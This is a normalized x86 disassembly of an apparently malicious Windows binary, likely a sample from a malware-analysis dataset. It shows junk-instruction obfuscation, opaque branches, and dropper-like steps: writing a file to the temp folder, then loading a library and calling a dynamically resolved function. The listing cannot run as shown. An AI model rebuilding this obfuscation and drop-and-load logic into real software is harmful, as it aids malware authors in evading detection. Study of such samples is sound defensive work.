cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x0
pop ebp
retn 0x24
push [ rw-data ]
push [ rw-data ]
call sub_4012dc
sub_40f855
push ebp
mov ebp esp
add esp 0xfffffffc
push esi
push ebp
mov ebp esp
pop ebp
push r-xdata
clc
jb r-xdata
call [ eax - 0x75 ]
leave
pop eax
mov ecx ecx
push eax
sub esi esi
pop eax
mov ecx ecx
push 0x123ea83
mov ecx ecx
pop [ ebp - 0x4 ]
mov edx eax
jmp r-xdata
retn
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx eax
mov ecx ecx
add eax esi
mov edx eax
mov ecx ecx
push eax
mov ecx ecx
mov edx eax
call GetTickCount
mov ecx ecx
pop eax
mov edx eax
mov ecx ecx
add eax edx
mov ecx ecx
mov edx eax
dec [ ebp - 0x4 ]
pop esi
leave
retn
sub_40f8b1
push ebp
mov ebp esp
push ebp
mov ebp esp
pop ebp
push r-xdata
clc
jb r-xdata
dec [ ebx - 0x3ff4f7bb ]
je r-xdata
retn
leave
retn 0x4
jmp r-xdata
cmp [ eax ] 0x0
jne r-xdata
dec [ eax ]
dec [ eax ]
inc eax
sub_40f8d9
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push ebp
mov ebp esp
pop ebp
push r-xdata
clc
jb r-xdata
inc edi
inc ebp
hlt
retn
sub_40f980
push [ ebp + 0x8 ]
call sub_40131f
push 0x8
push rw-data
push [ ebp + 0x8 ]
call sub_4014fb
push 0x8
push rw-data
push [ ebp + 0x8 ]
call sub_4014fb
push [ ebp + 0x8 ]
call sub_40f749
leave
retn 0x4
sub_40f9c6
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_401705
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x8 ]
push eax
push rw-data
call sub_402774
or eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
leave
retn 0x8
push eax
cmp [ ebp - 0x8 ] 0x10
jne r-xdata
call sub_401835
push 0x10
push eax
push [ ebp + 0xc ]
call sub_40189c
or eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x0
sub_40fa27
push [ ebp + 0x8 ]
call sub_40f96f
or eax eax
je r-xdata
mov ebx 0x3
push [ ebp + 0x8 ]
call sub_401082
or eax eax
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40f9b2
push [ ebp + 0x8 ]
call sub_401752
or eax eax
jne r-xdata
jmp r-xdata
push [ ebp + 0x8 ]
call sub_4015f2
or eax eax
jne r-xdata
jmp r-xdata
mov eax ebx
pop ebx
leave
retn 0x8
push [ ebp + 0x8 ]
call sub_401658
or eax eax
jne r-xdata
jmp r-xdata
push rw-data
push [ ebp + 0x8 ]
call sub_4019a4
or eax eax
jne r-xdata
jmp r-xdata
push [ ebp + 0x8 ]
call sub_4015f2
or eax eax
jne r-xdata
jmp r-xdata
push [ ebp + 0x8 ]
call sub_401658
or eax eax
jne r-xdata
jmp r-xdata
push [ ebp + 0x8 ]
call sub_401a69
or eax eax
jne r-xdata
jmp r-xdata
push [ ebp + 0x8 ]
call sub_401082
cmp eax 0x20
ja r-xdata
jmp r-xdata
or eax eax
je r-xdata
sub eax eax
cmp eax 0x100000
jae r-xdata
mov ebx 0x1
jmp r-xdata
sub_40faf8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40fa13
or eax eax
jne r-xdata
leave
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40fa13
or eax eax
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40fa13
sub_40fb25
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push edi
push ebp
mov ebp esp
pop ebp
push r-xdata
clc
jb r-xdata
[ ebx ]
retn
sub_40fb41
inc edi
inc ebp
in al dx
add [ eax ] al
add [ eax ] al
lea eax [ ebp - 0x14 ]
push eax
call sub_401000
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
call sub_401000
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push [ ebp - 0x14 ]
call sub_401021
mov eax ebx
pop edi
pop ebx
leave
retn
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x14 ]
call sub_40fae7
cmp eax 0x1
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
call sub_401000
mov edi rw-data
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
or ebx ebx
je r-xdata
or ebx ebx
je r-xdata
push 0x10
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_40265a
mov [ ebp - 0x1c ] 0x3
push [ ebp - 0x18 ]
call sub_401021
or ebx ebx
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push [ ebp - 0x18 ]
call sub_40f8d9
mov ebx eax
or ebx ebx
jne r-xdata
cmp [ edi ] 0x0
jne r-xdata
dec [ ebp - 0x1c ]
push 0x1388
call Sleep
jmp r-xdata
push [ ebp - 0x18 ]
call sub_401b3d
or eax eax
je r-xdata
inc edi
inc edi
mov [ ebp - 0x18 ] 0x0
lea eax [ ebp - 0x18 ]
push eax
push [ ebp - 0x14 ]
push edi
call sub_403d5c
or eax eax
je r-xdata
push [ ebp - 0x18 ]
call sub_40f8d9
mov ebx eax
sub_40fc34
push ebp
mov ebp esp
add esp 0xffffffec
push ebp
mov ebp esp
pop ebp
push r-xdata
clc
jb r-xdata
dec [ ebx - 0x6f36742e ]
push 0x105
call sub_40184c
nop
mov edx edx
mov ecx ecx
nop
mov [ ebp - 0x14 ] eax
nop
call GetTickCount
push eax
push rw-data
push [ ebp - 0x14 ]
call wsprintfA
add esp 0xc
push 0x105
call sub_40184c
nop
mov edx edx
mov ecx ecx
nop
mov [ ebp - 0x4 ] eax
mov edx edx
mov ecx ecx
nop
push 0x105
call sub_40184c
nop
mov edx edx
mov ecx ecx
mov [ ebp - 0x10 ] eax
nop
push 0x105
call sub_40184c
mov edx edx
mov ecx ecx
nop
mov edx edx
mov ecx ecx
mov [ ebp - 0x8 ] eax
mov ecx ecx
mov edx edx
mov edx edx
mov ecx ecx
nop
push 0x104
push [ ebp - 0x4 ]
push [ rw-data ]
call GetModuleFileNameA
nop
mov edx edx
mov ecx ecx
mov edx edx
mov ecx ecx
push [ ebp - 0x10 ]
push 0x104
call GetTempPathA
or eax eax
je r-xdata
retn
mov edx edx
push 0x0
push 0x0
push 0x2
push 0x0
push 0x3
push 0xc0000000
push [ ebp - 0x10 ]
call CreateFileA
mov ecx ecx
mov [ ebp - 0xc ] eax
mov ecx ecx
inc eax
or eax eax
jne r-xdata
mov ecx ecx
mov edx edx
nop
push [ ebp - 0x14 ]
push [ ebp - 0x10 ]
call lstrcatA
push rw-data
call lstrlenA
push eax
push rw-data
push [ ebp - 0xc ]
call sub_401422
push eax
push [ ebp - 0xc ]
call CloseHandle
pop eax
or eax eax
jne r-xdata
push [ ebp - 0x4 ]
push [ ebp - 0x10 ]
call lstrcpyA
push 0x5c
push 0x0
push [ ebp - 0x10 ]
call StrRChrIA
or eax eax
je r-xdata
push [ ebp - 0x4 ]
push rw-data
push [ ebp - 0x8 ]
call wsprintfA
add esp 0xc
push rw-data
call LoadLibraryA
or eax eax
je r-xdata
jmp r-xdata
push 0x0
push 0x0
push 0x2
push 0x0
push 0x3
push 0xc0000000
push [ ebp - 0x10 ]
call CreateFileA
mov [ ebp - 0xc ] eax
inc eax
je r-xdata
inc eax
push [ ebp - 0x14 ]
push eax
call lstrcpyA
push [ ebp - 0x14 ]
call sub_401835
push [ ebp - 0x4 ]
call sub_401835
push [ ebp - 0x10 ]
call sub_401835
push [ ebp - 0x8 ]
call sub_401835
leave
retn
push rw-data
push eax
call GetProcAddress
or eax eax
je r-xdata
push 0x0
push 0x0
push [ ebp - 0x8 ]
push [ ebp - 0x10 ]
push rw-data
push 0x0
call eax
sub_40fdf2
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push ebp
mov ebp esp
pop ebp
push r-xdata
clc
jb r-xdata
inc [ ebx + 0x414ac73d ]
add [ eax ] al
je r-xdata
retn
sub eax eax
pop ebx
leave
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x10 ] 0x0
push [ ebp - 0x4 ]
pop [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0xea
jne r-xdata
cmp [ ebp - 0x18 ] 0xea
jne r-xdata
mov ebx [ ebp - 0x8 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax 0x1
pop ebx
leave
retn
push [ ebp - 0x4 ]
call [ rw-data ]
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0xffffffff
lea eax [ ebp - 0x4 ]
push eax
push 0x2
push 0x3
push 0x0
call [ rw-data ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push [ ebx + 0x68 ]
call sub_402a27
mov [ ebp - 0x20 ] eax
push [ ebx ]
call sub_402a27
or eax eax
je r-xdata
push [ ebp - 0x4 ]
call [ rw-data ]
mov [ ebp - 0x4 ] 0x0
add ebx 0x74
dec [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
push 0xc
call sub_40184c
push [ ebp - 0x20 ]
pop [ eax + 0x8 ]
push [ ebp - 0x1c ]
pop [ eax + 0x4 ]
push [ rw-data ]
pop [ eax ]
mov [ rw-data ] eax
sub_40fefc
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push edi
push ebp
mov ebp esp
pop ebp
push r-xdata
clc
jb r-xdata
inc [ ebx + 0x414afb3d ]
add [ eax ] al
je r-xdata
retn
sub eax eax
pop edi
pop ebx
leave
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov ebx [ rw-data ]
jmp r-xdata
or ebx ebx
jne r-xdata
call sub_402b47
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
pop edi
pop ebx
leave
retn
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x2
push [ ebx + 0x4 ]
push 0x0
push [ ebx + 0x4 ]
call [ rw-data ]
or eax eax
je r-xdata
push [ ebx + 0x4 ]
push [ rw-data ]
call lstrcmpiA
or eax eax
jne r-xdata
push [ ebx + 0x4 ]
call sub_40299a
mov [ ebp - 0x8 ] eax
push [ ebx + 0x4 ]
call lstrlenA
push eax
push [ ebp - 0x8 ]
push eax
push [ ebx + 0x4 ]
push 0x100
push 0x400
call LCMapStringA
or eax eax
je r-xdata
jmp r-xdata
jmp r-xdata
push [ ebp - 0x8 ]
call sub_401835
mov edi rw-data
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x2
push [ ebp - 0x8 ]
push 0x0
push [ ebx + 0x4 ]
call [ rw-data ]
or eax eax
je r-xdata
mov [ ebp - 0x28 ] 0x20
mov [ ebp - 0x24 ] 0x1
push [ ebx + 0x4 ]
pop [ ebp - 0x20 ]
push [ ebx + 0x8 ]
pop [ ebp - 0x1c ]
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
lea eax [ ebp - 0x28 ]
push eax
push [ ebp - 0x4 ]
call LoadUserProfileA
or eax eax
je r-xdata
mov ebx [ ebx ]
cld
xor eax eax
mov ecx 0xffffffff
[ edi ]
cmp [ edi ] al
jne r-xdata
push [ ebp - 0x8 ]
call sub_401835
jmp r-xdata
mov [ ebp - 0x2c ] 0x0
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x2
push edi
push 0x0
push [ ebx + 0x4 ]
call [ rw-data ]
or eax eax
je r-xdata
cmp [ ebp - 0x2c ] 0x0
je r-xdata
call sub_40fb25
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x2c ] 0x1
jmp r-xdata
push [ ebp - 0xc ]
pop [ rw-data ]
push [ ebp - 0x4 ]
call CloseHandle
push [ ebp - 0xc ]
push [ ebp - 0x4 ]
call UnloadUserProfile
mov [ rw-data ] 0x80000001
call [ rw-data ]
push [ ebp - 0x4 ]
call [ rw-data ]
or eax eax
je r-xdata
sub_4100ed
call OleInitialize
call sub_4024ad
call sub_40f855
call sub_402b47
call sub_402b7e
or eax eax
je r-xdata
push 0x101
call sub_40184c
mov [ rw-data ] eax
mov [ ebp - 0x4 ] 0x101
lea eax [ ebp - 0x4 ]
push eax
push [ rw-data ]
call GetUserNameA
or eax eax
jne r-xdata
call sub_402c64
or eax eax
je r-xdata
call sub_402036
call sub_401d1a
push rw-data
call sub_40f8b1
leave
retn
push [ rw-data ]
call sub_401835
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
sub_4101a2
add [ ecx ] eax
call SetUnhandledExceptionFilter
call sub_4100d7
call sub_40f855
call sub_40fb25
cmp [ rw-data ] 0x0
je r-xdata
call sub_40fdf2
call sub_40fefc
call sub_40fc34
retn
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x80000001
call [ rw-data ]
sub_410440
mov eax [ esp + 0x4 ]
cmp eax 0x2
jge r-xdata
cmp eax 0x4
jge r-xdata
mov eax 0x64
retn 0x4
cmp eax 0x8
jge r-xdata
mov eax 0x2
retn 0x4
cmp eax 0x10
jge r-xdata
mov eax 0x4
retn 0x4
cmp eax 0x20
jge r-xdata
mov eax 0x6
retn 0x4
cmp eax 0x40
jge r-xdata
mov eax 0x8
retn 0x4
cmp eax 0x80
jge r-xdata
mov eax 0xa
retn 0x4
cmp eax 0x100
jge r-xdata
mov eax 0xc
retn 0x4
cmp eax 0x200
jge r-xdata
mov eax 0xe
retn 0x4
cmp eax 0x400
jge r-xdata
mov eax 0x10
retn 0x4
cmp eax 0x800
jge r-xdata
mov eax 0x12
retn 0x4
cmp eax 0x1000
jge r-xdata
mov eax 0x14
retn 0x4
cmp eax 0x2000
jge r-xdata
mov eax 0x16
retn 0x4
cmp eax 0x4000
jge r-xdata
mov eax 0x18
retn 0x4
cmp eax 0x8000
jge r-xdata
mov eax 0x1a
retn 0x4
xor ecx ecx
cmp eax 0x10000
setge cl
lea ecx [ ecx + ecx + 0x1e ]
mov eax ecx
retn 0x4
mov eax 0x1c
retn 0x4
sub_41052c
add [ ecx + 0x41c ] 0xffffffff
jne r-xdata
cmp [ esp + 0x4 ] 0x0
mov ecx [ ecx + 0x418 ]
je r-xdata
mov eax [ ecx + 0x410 ]
mov [ ecx + 0x418 ] eax
inc eax
mov [ ecx + 0x41c ] 0x8
mov [ ecx + 0x410 ] eax
shl [ ecx ] 0x1
retn 0x4
mov al [ ecx ]
add al al
inc al
mov [ ecx ] al
retn 0x4
sub_41059e
add [ ecx + 0x41c ] 0xffffffff
jne r-xdata
mov ecx [ ecx + 0x418 ]
mov al [ ecx ]
add al al
inc al
mov [ ecx ] al
retn
mov eax [ ecx + 0x410 ]
mov [ ecx + 0x418 ] eax
inc eax
mov [ ecx + 0x41c ] 0x8
mov [ ecx + 0x410 ] eax
sub_4105d3
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x4 ]
push ebp
push esi
push edi
xor esi esi
lea ecx [ ecx ]
mov edi eax
and edi 0x1
shr eax 0x1
inc esi
lea edx [ edi + edx * 2 ]
cmp eax 0x1
ja r-xdata
sub esi 0x1
mov ebp 0xffffffff
lea edi [ ebp + 0x9 ]
je r-xdata
add [ ecx + 0x41c ] ebp
jne r-xdata
push ebx
mov edi edi
mov eax [ ecx + 0x418 ]
test dl 0x1
je r-xdata
mov eax [ ecx + 0x410 ]
mov [ ecx + 0x418 ] eax
inc eax
mov [ ecx + 0x41c ] edi
mov [ ecx + 0x410 ] eax
mov eax [ ecx + 0x418 ]
test dl 0x1
je r-xdata
mov eax [ ecx + 0x410 ]
mov [ ecx + 0x418 ] eax
inc eax
mov [ ecx + 0x41c ] edi
mov [ ecx + 0x410 ] eax
shl [ eax ] 0x1
mov dl [ eax ]
add dl dl
inc dl
mov [ eax ] dl
jmp r-xdata
shl [ eax ] 0x1
mov bl [ eax ]
add bl bl
inc bl
mov [ eax ] bl
jmp r-xdata
mov ecx [ ecx + 0x418 ]
shl [ ecx ] 0x1
pop edi
pop esi
pop ebp
retn 0x4
mov eax [ ecx + 0x410 ]
mov [ ecx + 0x418 ] eax
inc eax
mov [ ecx + 0x41c ] edi
mov [ ecx + 0x410 ] eax
add [ ecx + 0x41c ] ebp
jne r-xdata
mov eax [ ecx + 0x418 ]
mov bl [ eax ]
add bl bl
inc bl
shr edx 0x1
sub esi 0x1
mov [ eax ] bl
jne r-xdata
mov eax [ ecx + 0x410 ]
mov [ ecx + 0x418 ] eax
inc eax
mov [ ecx + 0x41c ] edi
mov [ ecx + 0x410 ] eax
add [ ecx + 0x41c ] ebp
jne r-xdata
add [ ecx + 0x41c ] ebp
jne r-xdata
pop ebx
sub_4106d9
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push esi
xor eax eax
push edi
cmp ebp 0xf
jbe r-xdata
mov edi [ esp + 0x14 ]
mov esi edi
sub esi ebp
lea esp [ esp ]
mov ebp 0xf
add eax 0x7
mov ecx ebp
mov edx esi
lea ebx [ ebx ]
mov bl [ edi ]
test bl bl
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn 0xc
add eax 0x7
test ecx ecx
jne r-xdata
dec ecx
inc edx
test ecx ecx
jne r-xdata
inc edi
inc esi
sub [ esp + 0x1c ] 0x1
jne r-xdata
add eax 0x2
jmp r-xdata
cmp bl [ edx ]
je r-xdata
sub_410732
mov edx [ esp + 0x4 ]
push ebp
push esi
mov esi ecx
mov [ esi + 0x428 ] 0x0
mov cl [ edx ]
test cl cl
je r-xdata
or ecx 0xffffffff
add [ esi + 0x41c ] ecx
lea ebp [ ecx + 0x9 ]
jne r-xdata
push edi
mov edi [ esp + 0x14 ]
cmp edi 0xf
jbe r-xdata
mov eax [ esi + 0x418 ]
mov dl [ eax ]
add dl dl
inc dl
mov [ eax ] dl
add [ esi + 0x41c ] ecx
jne r-xdata
mov eax [ esi + 0x410 ]
mov [ esi + 0x418 ] eax
inc eax
mov [ esi + 0x41c ] ebp
mov [ esi + 0x410 ] eax
mov eax edx
sub eax edi
nop
mov edi 0xf
mov eax [ esi + 0x418 ]
mov dl [ eax ]
add dl dl
inc dl
mov [ eax ] dl
add [ esi + 0x41c ] ecx
jne r-xdata
mov eax [ esi + 0x410 ]
mov [ esi + 0x418 ] eax
inc eax
mov [ esi + 0x41c ] ebp
mov [ esi + 0x410 ] eax
test edi edi
je r-xdata
dec edi
inc eax
test edi edi
jne r-xdata
mov eax [ esi + 0x418 ]
mov dl [ eax ]
add dl dl
inc dl
mov [ eax ] dl
add [ esi + 0x41c ] ecx
jne r-xdata
mov eax [ esi + 0x410 ]
mov [ esi + 0x418 ] eax
inc eax
mov [ esi + 0x41c ] ebp
mov [ esi + 0x410 ] eax
add [ esi + 0x41c ] 0xffffffff
jne r-xdata
or ecx 0xffffffff
add [ esi + 0x41c ] ecx
lea ebp [ ecx + 0x9 ]
jne r-xdata
cmp cl [ eax ]
je r-xdata
mov eax [ esi + 0x418 ]
shl [ eax ] 0x1
add [ esi + 0x41c ] ecx
jne r-xdata
mov eax [ esi + 0x410 ]
mov [ esi + 0x418 ] eax
inc eax
mov [ esi + 0x41c ] ebp
mov [ esi + 0x410 ] eax
mov eax [ esi + 0x418 ]
shl [ eax ] 0x1
mov eax [ esi + 0x410 ]
mov cl [ edx ]
pop edi
mov [ eax ] cl
inc [ esi + 0x410 ]
pop esi
pop ebp
retn 0x8
mov eax [ esi + 0x410 ]
mov [ esi + 0x418 ] eax
inc eax
mov [ esi + 0x41c ] 0x8
mov [ esi + 0x410 ] eax
mov eax [ esi + 0x418 ]
mov dl [ eax ]
add dl dl
inc dl
mov [ eax ] dl
add [ esi + 0x41c ] ecx
jne r-xdata
mov eax [ esi + 0x410 ]
mov [ esi + 0x418 ] eax
inc eax
mov [ esi + 0x41c ] ebp
mov [ esi + 0x410 ] eax
mov eax [ esi + 0x418 ]
shl [ eax ] 0x1
add [ esi + 0x41c ] ecx
jne r-xdata
mov eax [ esi + 0x410 ]
mov [ esi + 0x418 ] eax
inc eax
mov [ esi + 0x41c ] ebp
mov [ esi + 0x410 ] eax
mov eax [ esi + 0x418 ]
mov dl [ eax ]
add dl dl
inc dl
mov [ eax ] dl
add [ esi + 0x41c ] ecx
jne r-xdata
mov eax [ esi + 0x410 ]
mov [ esi + 0x418 ] eax
inc eax
mov [ esi + 0x41c ] ebp
mov [ esi + 0x410 ] eax
mov eax [ esi + 0x418 ]
shl [ eax ] 0x1
add [ esi + 0x41c ] ecx
jne r-xdata
mov eax [ esi + 0x410 ]
mov [ esi + 0x418 ] eax
inc eax
mov [ esi + 0x41c ] ebp
mov [ esi + 0x410 ] eax
mov eax [ esi + 0x418 ]
mov cl [ eax ]
add cl cl
inc cl
mov edx edi
and edx ebp
mov [ eax ] cl
push edx
mov ecx esi
call sub_41052c
mov eax edi
and eax 0x4
push eax
mov ecx esi
call sub_41052c
mov ecx edi
and ecx 0x2
push ecx
mov ecx esi
call sub_41052c
and edi 0x1
push edi
mov ecx esi
call sub_41052c
pop edi
pop esi
pop ebp
retn 0x8
mov eax [ esi + 0x410 ]
mov [ esi + 0x418 ] eax
inc eax
mov [ esi + 0x41c ] ebp
mov [ esi + 0x410 ] eax
mov esi [ esi + 0x418 ]
shl [ esi ] 0x1
pop esi
pop ebp
retn 0x8
mov eax [ esi + 0x410 ]
mov [ esi + 0x418 ] eax
inc eax
mov [ esi + 0x41c ] ebp
mov [ esi + 0x410 ] eax
sub_4109ba
mov eax [ esp + 0x4 ]
push esi
push edi
mov edi [ esp + 0x10 ]
mov esi ecx
cmp eax 0x80
jae r-xdata
cmp eax [ esi + 0x424 ]
je r-xdata
cmp edi 0x4
jae r-xdata
push edi
call sub_410440
pop edi
add eax 0x4
pop esi
retn 0x8
cmp eax 0x80
jae r-xdata
cmp eax [ esi + 0x424 ]
je r-xdata
cmp eax 0x500
jb r-xdata
sub edi 0x2
jmp r-xdata
neg eax
sbb eax eax
and eax 0x6
pop edi
add eax 0x5
pop esi
retn 0x8
cmp eax 0x7d00
jb r-xdata
dec edi
shr eax 0x8
push ebx
add eax 0x3
push eax
call sub_410440
push edi
mov ecx esi
mov ebx eax
call sub_410440
lea eax [ eax + ebx + 0xa ]
pop ebx
pop edi
pop esi
retn 0x8
dec edi
sub_410a3c
push ebx
mov ebx [ esp + 0x8 ]
push ebp
push esi
mov esi ecx
cmp [ esi + 0x428 ] 0x0
push edi
je r-xdata
mov [ esi + 0x428 ] 0x1
cmp ebx 0x80
jae r-xdata
cmp ebx 0x80
jae r-xdata
or edi 0xffffffff
add [ esi + 0x41c ] edi
lea ebp [ edi + 0x9 ]
jne r-xdata
cmp [ esp + 0x18 ] 0x4
jae r-xdata
or edi 0xffffffff
add [ esi + 0x41c ] edi
lea ebp [ edi + 0x9 ]
jne r-xdata
cmp [ esp + 0x18 ] 0x4
jae r-xdata
mov eax [ esi + 0x418 ]
mov dl [ eax ]
add dl dl
inc dl
mov [ eax ] dl
add [ esi + 0x41c ] edi
jne r-xdata
mov eax [ esi + 0x410 ]
mov [ esi + 0x418 ] eax
inc eax
mov [ esi + 0x41c ] ebp
mov [ esi + 0x410 ] eax
cmp ebx [ esi + 0x424 ]
je r-xdata
mov eax [ esi + 0x418 ]
mov cl [ eax ]
add cl cl
inc cl
mov [ eax ] cl
add [ esi + 0x41c ] edi
jne r-xdata
mov eax [ esi + 0x410 ]
mov [ esi + 0x418 ] eax
inc eax
mov [ esi + 0x41c ] ebp
mov [ esi + 0x410 ] eax
call sub_41059e
mov ecx esi
call sub_41059e
mov ecx esi
call sub_41056f
mov al [ esp + 0x18 ]
mov edx [ esi + 0x410 ]
mov cl bl
and al 0x1
add cl cl
add al cl
pop edi
mov [ edx ] al
inc [ esi + 0x410 ]
mov [ esi + 0x424 ] ebx
pop esi
pop ebp
pop ebx
retn 0x8
mov eax [ esi + 0x418 ]
shl [ eax ] 0x1
cmp ebx [ esi + 0x424 ]
je r-xdata
mov eax [ esi + 0x410 ]
mov [ esi + 0x418 ] eax
inc eax
mov [ esi + 0x41c ] ebp
mov [ esi + 0x410 ] eax
call sub_41059e
mov ecx esi
call sub_41059e
mov ecx esi
call sub_41056f
mov al [ esp + 0x18 ]
mov ecx [ esi + 0x410 ]
mov dl bl
and al 0x1
add dl dl
add al dl
pop edi
mov [ ecx ] al
inc [ esi + 0x410 ]
mov [ esi + 0x424 ] ebx
pop esi
pop ebp
pop ebx
retn 0x8
mov eax [ esi + 0x418 ]
shl [ eax ] 0x1
mov edx ebx
shr edx 0x8
add edx 0x2
push edx
mov ecx esi
call sub_4105d3
mov eax [ esi + 0x410 ]
mov [ eax ] bl
mov eax 0x1
add [ esi + 0x410 ] eax
mov [ esi + 0x424 ] ebx
cmp ebx 0x80
jae r-xdata
mov eax [ esi + 0x410 ]
mov [ esi + 0x418 ] eax
inc eax
mov [ esi + 0x41c ] ebp
mov [ esi + 0x410 ] eax
add [ esi + 0x41c ] edi
jne r-xdata
mov eax ebx
shr eax 0x8
add eax 0x3
push eax
call sub_4105d3
mov ecx [ esi + 0x410 ]
mov [ ecx ] bl
mov eax 0x1
add [ esi + 0x410 ] eax
mov [ esi + 0x424 ] ebx
cmp ebx 0x80
jae r-xdata
cmp ebx 0x500
jb r-xdata
sub [ esp + 0x18 ] 0x2
mov ecx [ esp + 0x18 ]
push ecx
mov ecx esi
call sub_4105d3
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
mov eax [ esi + 0x418 ]
shl [ eax ] 0x1
add [ esi + 0x41c ] edi
jne r-xdata
mov eax [ esi + 0x410 ]
mov [ esi + 0x418 ] eax
inc eax
mov [ esi + 0x41c ] ebp
mov [ esi + 0x410 ] eax
cmp ebx 0x500
jb r-xdata
sub [ esp + 0x18 ] 0x2
mov edx [ esp + 0x18 ]
push edx
mov ecx esi
call sub_4105d3
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
cmp ebx 0x7d00
jb r-xdata
sub [ esp + 0x18 ] eax
mov eax [ esi + 0x418 ]
shl [ eax ] 0x1
mov eax [ esi + 0x410 ]
mov [ esi + 0x418 ] eax
inc eax
mov [ esi + 0x41c ] ebp
mov [ esi + 0x410 ] eax
cmp ebx 0x7d00
jb r-xdata
sub [ esp + 0x18 ] eax
mov ecx [ esp + 0x18 ]
push ecx
mov ecx esi
call sub_4105d3
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
sub [ esp + 0x18 ] eax
mov edx [ esp + 0x18 ]
push edx
mov ecx esi
call sub_4105d3
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
sub [ esp + 0x18 ] eax
mov edx [ esp + 0x18 ]
push edx
mov ecx esi
call sub_4105d3
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
sub_410d06
mov eax [ esp + 0x4 ]
lea edx [ eax + 0x16800 ]
cmp edx [ ecx + 0x404 ]
jbe r-xdata
xor eax eax
retn 0x4
mov ecx [ ecx + 0x40c ]
cmp eax ecx
jbe r-xdata
sub eax ecx
add eax 0x16800
retn 0x4
sub eax ecx
retn 0x4
sub_410d36
sub esp 0x10
push ebx
push ebp
mov ebp [ esp + 0x20 ]
push esi
xor ebx ebx
mov esi ecx
push edi
mov [ esp + 0x10 ] ebx
mov [ esp + 0x18 ] ebx
cmp [ esi + 0x408 ] ebp
jae r-xdata
mov eax [ esp + 0x30 ]
mov edx 0x16700
cmp eax edx
jbe r-xdata
jmp r-xdata
cmp eax 0x1
jbe r-xdata
mov [ esp + 0x30 ] edx
jmp r-xdata
mov eax [ esi + 0x404 ]
lea ecx [ eax + 0x16800 ]
cmp ecx eax
jbe r-xdata
mov eax [ esp + 0x24 ]
mov edx [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
pop edi
pop esi
pop ebp
mov [ eax + 0x4 ] edx
mov [ eax ] ecx
pop ebx
add esp 0x10
retn 0x10
movzx eax [ ebp ]
movzx ecx [ ebp + 0x1 ]
mov eax [ esi + eax * 4 + 0x4 ]
mov edi [ eax + ecx * 4 ]
cmp edi ebx
je r-xdata
xor eax eax
mov ecx [ esi + 0x40c ]
cmp eax ecx
jbe r-xdata
mov ecx [ esi + 0x420 ]
lea eax [ edi + ecx ]
mov [ esp + 0x1c ] 0x800
cmp eax ebp
jb r-xdata
cmp [ esi + 0x408 ] ebp
jb r-xdata
dec eax
mov [ esi + 0x40c ] eax
sub eax ecx
add eax 0x16800
jmp r-xdata
sub eax ecx
jmp r-xdata
cmp [ esp + 0x2c ] edx
jbe r-xdata
mov edi edi
mov ecx [ esi + 0x408 ]
movzx edx [ ecx ]
movzx ecx [ ecx + 0x1 ]
mov edx [ esi + edx * 4 + 0x4 ]
mov ecx [ edx + ecx * 4 ]
mov edi [ esi ]
mov [ edi + eax * 4 ] ecx
mov eax [ esi + 0x408 ]
movzx edx [ eax ]
movzx eax [ eax + 0x1 ]
mov ecx [ esi + edx * 4 + 0x4 ]
mov edx [ esi + 0x404 ]
mov [ ecx + eax * 4 ] edx
mov ecx 0x1
add [ esi + 0x404 ] ecx
